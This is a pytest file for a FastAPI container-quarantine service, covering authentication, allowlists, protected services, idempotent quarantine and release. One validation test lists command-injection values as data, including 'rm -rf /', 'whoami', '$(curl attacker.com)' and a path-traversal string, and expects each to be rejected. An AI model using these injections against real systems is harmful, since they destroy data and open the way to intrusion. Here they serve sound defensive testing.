"""
Unit tests for the AutoTrace-Sec Security Actuator REST API.
"""

from __future__ import annotations

from unittest.mock import patch

import pytest
from fastapi.testclient import TestClient

from src.app import app, get_config, get_engine
from src.config import ActuatorConfig
from src.containment import ContainmentEngine, ContainmentResult


@pytest.fixture
def client():
    """Create a test client with default dry-run configuration and shared engine."""
    test_config = ActuatorConfig()
    test_config.dry_run = True
    test_config.api_key = ""
    test_engine = ContainmentEngine(test_config)

    app.dependency_overrides[get_config] = lambda: test_config
    app.dependency_overrides[get_engine] = lambda: test_engine

    with TestClient(app) as test_client:
        yield test_client

    app.dependency_overrides.clear()


@pytest.fixture
def auth_client():
    """Create a test client with strict API key authentication enabled."""
    test_config = ActuatorConfig()
    test_config.dry_run = False
    test_config.api_key = "secret-test-token-42"
    test_engine = ContainmentEngine(test_config)

    app.dependency_overrides[get_config] = lambda: test_config
    app.dependency_overrides[get_engine] = lambda: test_engine

    with TestClient(app) as test_client:
        yield test_client

    app.dependency_overrides.clear()


class TestHealthAndReadiness:
    """Tests for health and readiness probes."""

    def test_health_check_returns_healthy(self, client: TestClient):
        response = client.get("/health")
        assert response.status_code == 200
        data = response.json()
        assert data["status"] == "HEALTHY"
        assert data["service"] == "actuator-security"
        assert data["version"] == "0.1.0"
        assert data["dry_run"] is True

    def test_readiness_check_in_dry_run_mode(self, client: TestClient):
        response = client.get("/ready")
        assert response.status_code == 200
        data = response.json()
        assert data["status"] == "READY"
        assert data["dry_run"] is True


class TestAuthentication:
    """Tests for API key authentication and authorization."""

    def test_missing_api_key_when_required(self, auth_client: TestClient):
        payload = {
            "culprit_service": "reviews-service",
            "container_id": "reviews-service",
            "target_service": "payment-vault",
            "reason": "Test quarantine",
        }
        response = auth_client.post("/api/v1/quarantine", json=payload)
        assert response.status_code == 401
        assert "Missing X-API-Key" in response.json()["detail"]

    def test_invalid_api_key_rejected(self, auth_client: TestClient):
        payload = {
            "culprit_service": "reviews-service",
            "container_id": "reviews-service",
            "target_service": "payment-vault",
            "reason": "Test quarantine",
        }
        response = auth_client.post(
            "/api/v1/quarantine",
            json=payload,
            headers={"X-API-Key": "wrong-token"},
        )
        assert response.status_code == 403
        assert "Invalid API key" in response.json()["detail"]

    def test_valid_api_key_accepted(self, auth_client: TestClient):
        payload = {
            "culprit_service": "reviews-service",
            "container_id": "reviews-service",
            "target_service": "payment-vault",
            "reason": "Test quarantine",
        }
        mock_result = ContainmentResult(
            success=True,
            action="NETWORK_ISOLATION",
            execution_time_ms=15.0,
            detail="Container 'reviews-service' disconnected from 'autotrace-mesh'",
        )
        with patch.object(ContainmentEngine, "quarantine", return_value=mock_result) as mock_quarantine:
            response = auth_client.post(
                "/api/v1/quarantine",
                json=payload,
                headers={"X-API-Key": "secret-test-token-42"},
            )
            # Passed authentication (got past 401/403) and allowlists to containment execution
            assert response.status_code == 200
            assert response.json()["status"] == "CONTAINED"
            mock_quarantine.assert_called_once_with(
                container_id="reviews-service",
                network_name="autotrace-mesh",
                culprit_service="reviews-service",
            )


class TestInputValidation:
    """Tests for request schema validation and injection prevention."""

    def test_missing_culprit_service_rejected(self, client: TestClient):
        payload = {
            "target_service": "payment-vault",
            "reason": "Missing culprit",
        }
        response = client.post("/api/v1/quarantine", json=payload)
        assert response.status_code == 422

    def test_command_injection_attempt_in_service_name_rejected(self, client: TestClient):
        injection_payloads = [
            "reviews-service; rm -rf /",
            "reviews-service && whoami",
            "reviews-service`id`",
            "reviews-service$(curl attacker.com)",
            "../../../etc/passwd",
        ]
        for bad_name in injection_payloads:
            payload = {
                "culprit_service": bad_name,
                "container_id": bad_name,
                "target_service": "payment-vault",
                "reason": "Injection test",
            }
            response = client.post("/api/v1/quarantine", json=payload)
            assert response.status_code == 422, f"Failed to reject injection: {bad_name}"

    def test_culprit_not_in_allowlist_rejected(self, client: TestClient):
        payload = {
            "culprit_service": "unauthorized-external-service",
            "container_id": "unauthorized-external-service",
            "target_service": "payment-vault",
            "reason": "Not allowlisted",
        }
        response = client.post("/api/v1/quarantine", json=payload)
        assert response.status_code == 400
        assert "not in the allowed culprits list" in response.json()["detail"]

    def test_target_not_in_allowlist_rejected(self, client: TestClient):
        payload = {
            "culprit_service": "reviews-service",
            "container_id": "reviews-service",
            "target_service": "unauthorized-target",
            "reason": "Target not allowlisted",
        }
        response = client.post("/api/v1/quarantine", json=payload)
        assert response.status_code == 400
        assert "not in the allowed targets list" in response.json()["detail"]

    def test_protected_service_cannot_be_quarantined(self, client: TestClient):
        protected_services = ["redpanda", "redis", "telemetry-collector", "graph-engine", "actuator-security"]
        for svc in protected_services:
            payload = {
                "culprit_service": svc,
                "container_id": svc,
                "target_service": "payment-vault",
                "reason": "Attempting to isolate infrastructure",
            }
            response = client.post("/api/v1/quarantine", json=payload)
            assert response.status_code == 403
            assert "protected infrastructure service" in response.json()["detail"]


class TestQuarantineExecution:
    """Tests for quarantine processing and duplicate handling."""

    def test_successful_quarantine_in_dry_run_mode(self, client: TestClient):
        payload = {
            "culprit_service": "reviews-service",
            "container_id": "reviews-service",
            "target_service": "payment-vault",
            "reason": "Unauthorized lateral movement",
        }
        response = client.post("/api/v1/quarantine", json=payload)
        assert response.status_code == 200
        data = response.json()
        assert data["status"] == "DRY_RUN"
        assert data["action_taken"] == "NETWORK_ISOLATION"
        assert data["execution_time_ms"] >= 0
        assert data["culprit_service"] == "reviews-service"
        assert data["container_id"] == "reviews-service"
        assert data["target_service"] == "payment-vault"

    def test_duplicate_quarantine_is_idempotent(self, client: TestClient):
        payload = {
            "culprit_service": "reviews-service",
            "container_id": "reviews-service",
            "target_service": "payment-vault",
            "reason": "Unauthorized lateral movement",
        }
        # First call
        res1 = client.post("/api/v1/quarantine", json=payload)
        assert res1.status_code == 200

        # Duplicate call
        res2 = client.post("/api/v1/quarantine", json=payload)
        assert res2.status_code == 200
        data2 = res2.json()
        assert data2["status"] == "ALREADY_CONTAINED"
        assert "already quarantined" in data2["detail"]

    def test_quarantine_status_tracking(self, client: TestClient):
        payload = {
            "culprit_service": "order-service",
            "container_id": "order-service",
            "target_service": "payment-vault",
            "reason": "Test tracking",
        }
        client.post("/api/v1/quarantine", json=payload)

        status_res = client.get("/api/v1/quarantine/status")
        assert status_res.status_code == 200
        data = status_res.json()
        assert "order-service" in data["quarantined_services"]
        assert data["count"] >= 1

    def test_release_service(self, client: TestClient):
        # Quarantine first
        payload = {
            "culprit_service": "reviews-service",
            "container_id": "reviews-service",
            "target_service": "payment-vault",
            "reason": "Quarantine before release",
        }
        client.post("/api/v1/quarantine", json=payload)

        # Release
        rel_res = client.post("/api/v1/release", json={"container_id": "reviews-service"})
        assert rel_res.status_code == 200
        assert rel_res.json()["status"] == "RELEASED"

        # Check status is now cleared
        status_res = client.get("/api/v1/quarantine/status")
        assert "reviews-service" not in status_res.json()["quarantined_services"]
